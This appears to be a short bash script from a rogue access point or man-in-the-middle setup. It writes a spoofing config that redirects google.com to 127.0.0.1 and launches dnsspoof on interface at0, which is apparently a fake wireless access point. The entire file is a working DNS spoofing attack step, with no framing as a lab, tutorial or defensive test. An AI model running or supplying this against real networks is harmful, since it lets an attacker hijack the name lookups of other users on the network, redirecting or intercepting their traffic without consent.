#! /bin/bash

# setup dns spoofing

echo "
127.0.0.1	google.com
" > config/dnsspoof.conf

dnsspoof -i at0 -f config/dnsspoof.conf
